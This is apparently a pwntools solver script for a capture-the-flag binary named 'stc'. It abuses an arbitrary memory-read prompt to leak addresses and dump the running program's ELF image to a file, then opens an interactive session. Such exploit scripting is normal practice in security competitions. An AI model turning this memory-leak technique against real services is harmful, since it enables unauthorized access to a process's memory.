#!/usr/bin/env python3

from pwn import *
from doglib.fmt import DumpELF

exe = ELF("./stc")
# ld = ELF("./ld-musl-x86_64.so.1")

context.binary = exe
global p

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.GDB:
            gdb.attach(p,gdbscript='''

''')
            sleep(2)
    else:
        p = remote("",0)
        if args.POW:
            data = p.recvregex(r's\.[A-Za-z0-9+/=]+\.[A-Za-z0-9+/=]+')
            print(data)
            
    return p
    
def set_alias(p):
    p.sla = p.sendlineafter
    p.sl = p.sendline
    p.sa = p.sendafter
    p.s = p.send
    p.ru = p.readuntil
    p.rl = p.readline
    return p

def leak(address):
    p.sla("Where to, captain?",str(address))
    p.ru("We gathered ")
    leak = p64(int(p.ru(" ")))
    return leak
    
def main():
    global p
    p = set_alias(conn())
    d = DumpELF(leak,exe.sym['main'])
    data = d.dump_elf()
    with open("potential_stc.bin","wb") as f:
        f.write(data)
    # print(d.dump_elf())
    
    
    
    p.interactive() # PLIMB's up!
    
if __name__ == "__main__":
    main()
